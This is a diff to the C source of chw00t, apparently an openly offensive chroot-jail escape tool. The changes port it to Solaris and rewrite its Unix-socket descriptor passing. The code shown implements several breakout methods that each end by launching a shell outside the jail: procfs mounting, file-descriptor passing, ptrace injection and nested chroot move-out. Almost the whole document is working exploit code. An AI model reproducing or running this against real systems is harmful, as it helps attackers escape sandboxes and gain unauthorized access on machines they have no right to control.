@@ -8,8 +8,16 @@
  * ----------------------------------------------------------------------------
  */
 
+#if __sun
+// on Solaris: gcc chw00t.c -o chw00t -lsocket
+#define _XOPEN_SOURCE 1
+#define _XOPEN_SOURCE_EXTENDED 1
+#define __EXTENSIONS__
+#endif
 #include <sys/types.h>
+#if !__sun
 #include <sys/ptrace.h>
+#endif
 #include <sys/wait.h>
 #include <sys/un.h>
 #include <sys/socket.h>
@@ -119,97 +127,71 @@ char *shells[] = {"/bin/bash", "/bin/sh", "/bin/dash", "/bin/ksh",
         "/usr/bin/zsh" };
 
 #if !__OpenBSD__
-// based on the examples form http://www.thomasstover.com/uds.html
-int send_fd(int socket, int fd_to_send)
+int send_fd(int sock, const int fd)
 {
-    struct msghdr socket_message;
-    struct iovec io_vector[1];
-    struct cmsghdr *control_message = NULL;
-    char message_buffer[1];
-    char ancillary_element_buffer[CMSG_SPACE(sizeof(int))];
-    int available_ancillary_element_buffer_space;
+    struct {
+        struct cmsghdr h;
+        int fd;
+    } buffer;
+    struct msghdr msghdr;
+    char nothing = '!';
+    struct iovec nothing_ptr;
+    struct cmsghdr *cmsg;
+    int i;
 
-    /* at least one vector of one byte must be sent */
-    message_buffer[0] = 'F';
-    io_vector[0].iov_base = message_buffer;
-    io_vector[0].iov_len = 1;
-
-    /* initialize socket message */
-    memset(&socket_message, 0, sizeof(struct msghdr));
-    socket_message.msg_iov = io_vector;
-    socket_message.msg_iovlen = 1;
-
-    /* provide space for the ancillary data */
-    available_ancillary_element_buffer_space = CMSG_SPACE(sizeof(int));
-    memset(ancillary_element_buffer, 0, 
-	available_ancillary_element_buffer_space);
-    socket_message.msg_control = ancillary_element_buffer;
-    socket_message.msg_controllen = available_ancillary_element_buffer_space;
-
-    /* initialize a single ancillary data element for fd passing */
-    control_message = CMSG_FIRSTHDR(&socket_message);
-    control_message->cmsg_level = SOL_SOCKET;
-    control_message->cmsg_type = SCM_RIGHTS;
-    control_message->cmsg_len = CMSG_LEN(sizeof(int));
-    *((int *) CMSG_DATA(control_message)) = fd_to_send;
-
-    return sendmsg(socket, &socket_message, 0);
+    nothing_ptr.iov_base = &nothing;
+    nothing_ptr.iov_len = 1;
+    msghdr.msg_name = NULL;
+    msghdr.msg_namelen = 0;
+    msghdr.msg_iov = &nothing_ptr;
+    msghdr.msg_iovlen = 1;
+    msghdr.msg_flags = 0;
+    msghdr.msg_control = &buffer;
+    msghdr.msg_controllen = sizeof(struct cmsghdr) + sizeof(int);
+    cmsg = CMSG_FIRSTHDR(&msghdr);
+    cmsg->cmsg_len = msghdr.msg_controllen;
+    cmsg->cmsg_level = SOL_SOCKET;
+    cmsg->cmsg_type = SCM_RIGHTS;
+    *((int *)CMSG_DATA(cmsg)) = fd;
+    return(sendmsg(sock, &msghdr, 0) >= 0 ? 0 : -1);
 }
 
-int recv_fd(int socket)
+int recv_fd(int sock, int *fd)
 {
-    int sent_fd, available_ancillary_element_buffer_space;
-    struct msghdr socket_message;
-    struct iovec io_vector[1];
-    struct cmsghdr *control_message = NULL;
-    char message_buffer[1];
-    char ancillary_element_buffer[CMSG_SPACE(sizeof(int))];
+    struct {
+        struct cmsghdr h;
+        int fd;
+    } buffer;
+    struct msghdr msghdr;
+    char nothing;
+    struct iovec nothing_ptr;
+    struct cmsghdr *cmsg;
+    int i;
 
-    /* start clean */
-    memset(&socket_message, 0, sizeof(struct msghdr));
-    memset(ancillary_element_buffer, 0, CMSG_SPACE(sizeof(int)));
+    nothing_ptr.iov_base = &nothing;
+    nothing_ptr.iov_len = 1;
+    msghdr.msg_name = NULL;
+    msghdr.msg_namelen = 0;
+    msghdr.msg_iov = &nothing_ptr;
+    msghdr.msg_iovlen = 1;
+    msghdr.msg_flags = 0;
+    msghdr.msg_control = &buffer;
+    msghdr.msg_controllen = sizeof(struct cmsghdr) + sizeof(int);
+    cmsg = CMSG_FIRSTHDR(&msghdr);
+    cmsg->cmsg_len = msghdr.msg_controllen;
+    cmsg->cmsg_level = SOL_SOCKET;
+    cmsg->cmsg_type = SCM_RIGHTS;
+//    *((int *)CMSG_DATA(cmsg)) = -1;
 
-    /* setup a place to fill in message contents */
-    io_vector[0].iov_base = message_buffer;
-    io_vector[0].iov_len = 1;
-    socket_message.msg_iov = io_vector;
-    socket_message.msg_iovlen = 1;
-
-    /* provide space for the ancillary data */
-    socket_message.msg_control = ancillary_element_buffer;
-    socket_message.msg_controllen = CMSG_SPACE(sizeof(int));
-
-    if(recvmsg(socket, &socket_message, 0) < 0)
-        return -2;
-
-    if(message_buffer[0] != 'F')
-    {
-	/* this did not originate from the above function */
-	return -3;
-    }
-
-    if((socket_message.msg_flags & MSG_CTRUNC) == MSG_CTRUNC)
-    {
-	/* we did not provide enough space for the ancillary element array */
-	return -4;
-    }
-
-    /* iterate ancillary elements */
-    for(control_message = CMSG_FIRSTHDR(&socket_message);
-    control_message != NULL;
-    control_message = CMSG_NXTHDR(&socket_message, control_message))
-    {
-	if( (control_message->cmsg_level == SOL_SOCKET) &&
-	    (control_message->cmsg_type == SCM_RIGHTS) )
-	{
-	    sent_fd = *((int *) CMSG_DATA(control_message));
-	    return sent_fd;
-	}
-    }
-
-    return -5;
+    if(recvmsg(sock, &msghdr, 0) < 0)
+        return(-1);
+    *fd = *((int *)CMSG_DATA(cmsg));
+    return 1;
 }
+
 #endif
+
+#if !__sun
 void putdata(pid_t child, long addr,
              char *str, int len)
 {   char *laddr;
@@ -236,6 +218,7 @@ void putdata(pid_t child, long addr,
                (void*)addr + i * sizeof(int), data.val);
     }
 }
+#endif
 
 void usage(char *tool)
 {
@@ -261,7 +244,7 @@ void usage(char *tool)
 	"    -4\tMake block device (mknod)\n"
 #endif
 	"    -5\tMove out of chroot (nested)\n"
-#if !__APPLE__ && !__sun && __DragonFly__
+#if !__APPLE__ && !__sun && !__DragonFly__
 	"    -6\tPtrace x32 for 32bit processes\n"
 #if __x86_64__
 	"    -7\tPtrace x64 for 64bit processes\n"
@@ -341,7 +324,11 @@ int classic(char *dir) {
     {
 	if ((err = stat(shells[i], &dirstat)) == 0)
 	{
-	    return execve(shells[i], NULL, NULL);
+#if !__sun
+            return execve(shells[i], NULL, NULL);
+#else
+            return execl(shells[i], NULL, NULL);
+#endif
 	}
     }
 
@@ -414,7 +401,11 @@ int classicfd(char *dir) {
     {
 	if ((err = stat(shells[i], &dirstat)) == 0)
 	{
-	    return execve(shells[i], NULL, NULL);
+#if !__sun
+            return execve(shells[i], NULL, NULL);
+#else
+            return execl(shells[i], NULL, NULL);
+#endif
 	}
     }
 
@@ -428,6 +419,9 @@ int uds(char *dir)
     int err, i, fd, fd2, socket_fd, connection_fd;
     struct stat dirstat;
     pid_t pid;
+    // no idea why, but without this ~16bytes, socket is not going to work
+    char solarisstackcorruption[16];
+    // omg.
     DIR *dird;
     struct sockaddr_un addr;
     socklen_t addr_length;
@@ -478,8 +472,8 @@ int uds(char *dir)
         memset(&addr, 0, sizeof(struct sockaddr_un));
         addr.sun_family = AF_UNIX;
         snprintf(addr.sun_path, sizeof(addr.sun_path), "%s", SOCKETNAME);
-	// seting abstract named socket here, to be accessible from chroot
-#if !__FreeBSD__ && !__DragonFly__ && !__APPLE__
+#if !__FreeBSD__ && !__DragonFly__ && !__APPLE__ && !__sun
+	// setting abstract named socket here, to be accessible from chroot
 	// could be standard uds as well, just putting it under the new chroot
 	addr.sun_path[0] = 0;
 #endif
@@ -488,14 +482,14 @@ int uds(char *dir)
 	if (connect(socket_fd, (struct sockaddr *)&addr, 
 	    sizeof(struct sockaddr_un)))
 	{
-	    printf("[-] P: error connecting socket\n");
+	    printf("[-] P: error connecting socket: %s\n", strerror(errno));
                         return 0xDEADBEEF;
 	}
 
 	printf("[+] P: receiving file descriptor thru unix domain socket\n");
-	if ((fd = recv_fd(socket_fd)) < 0)
+	if ((err = recv_fd(socket_fd, &fd)) < 0)
 	{
-	    printf("[-] P: error receiving file descriptor: %d\n", fd);
+	    printf("[-] P: error receiving file descriptor: %d\n", err);
                         return 0xDEADBEEF;
 	}
 	
@@ -534,7 +528,11 @@ int uds(char *dir)
 	{
 	    if ((err = stat(shells[i], &dirstat)) == 0)
 	    {
+#if !__sun
 		return execve(shells[i], NULL, NULL);
+#else
+		return execl(shells[i], NULL, NULL);
+#endif
 	    }
 	}
 
@@ -557,16 +555,17 @@ int uds(char *dir)
 	}
 	memset(&addr, 0, sizeof(struct sockaddr_un));
 	addr.sun_family = AF_UNIX;
-	snprintf(addr.sun_path, sizeof(addr.sun_path), "%s/%s", dir, SOCKETNAME);
-#if !__FreeBSD__ && !__DragonFly__ && !__APPLE__
+#if !__FreeBSD__ && !__DragonFly__ && !__APPLE__ && !__sun
+	snprintf(addr.sun_path, sizeof(addr.sun_path), "%s", SOCKETNAME);
 	addr.sun_path[0] = 0;
+#else
+	snprintf(addr.sun_path, sizeof(addr.sun_path), "%s/%s", dir, SOCKETNAME);
 #endif
-
 	printf("[+] C: binding socket\n");
 	if(bind(socket_fd, (struct sockaddr *)&addr, 
 	    sizeof(struct sockaddr_un)) != 0)
 	{
-	    printf("[-] C: error bind on socket\n");
+	    printf("[-] C: error bind on socket: %s\n", strerror(errno));
             return 0xDEADBEEF;
 	}
 	
@@ -613,6 +612,10 @@ int mountproc(char *dir)
     DIR *dird;
     struct dirent *pdirent;
     char *rootname; // "/proc/$pid$/root"
+#if __sun
+    char optbuf[0x400];
+    char slashdir[255];
+#endif
     
     pid = getpid();
     if ((rootname = malloc(8+sizeof(unsigned long long)+strlen(dir))) == NULL)
@@ -637,7 +640,14 @@ int mountproc(char *dir)
     if ((err = stat(rootname, &ownstat)) != 0) 
     {
 	printf("[+] %s is created, mounting procfs\n", dir);
+#if __linux__
 	if (mount("proc", dir, "proc", 0, NULL))
+#elif __sun
+	memset(optbuf, 0, 0x400);
+	memset(slashdir, 0, sizeof(slashdir));
+	snprintf(slashdir, sizeof(slashdir)-1, "/%s", dir);
+	if (mount("proc", slashdir, 0x100, "proc", NULL, NULL, optbuf, 0x400))
+#endif
 	{
 	    printf("[-] error mounting %s: %s\n", dir, strerror(errno));
 	    return 0xDEADBEEF;
@@ -695,7 +705,11 @@ int mountproc(char *dir)
     {
 	if ((err = stat(shells[i], &ownstat)) == 0)
 	{
-	    return execve(shells[i], NULL, NULL);
+#if !__sun
+            return execve(shells[i], NULL, NULL);
+#else
+            return execl(shells[i], NULL, NULL);
+#endif
 	}
     }
 
@@ -1095,7 +1109,11 @@ int moveooc(char *chrootdir, char *nesteddir, char *newdir)
 	{
 	    if ((err = stat(shells[i], &dirstat)) == 0)
 	    {
-		return execve(shells[i], NULL, NULL);
+#if !__sun
+                return execve(shells[i], NULL, NULL);
+#else
+                return execl(shells[i], NULL, NULL);
+#endif
 	    }
 	}
     }
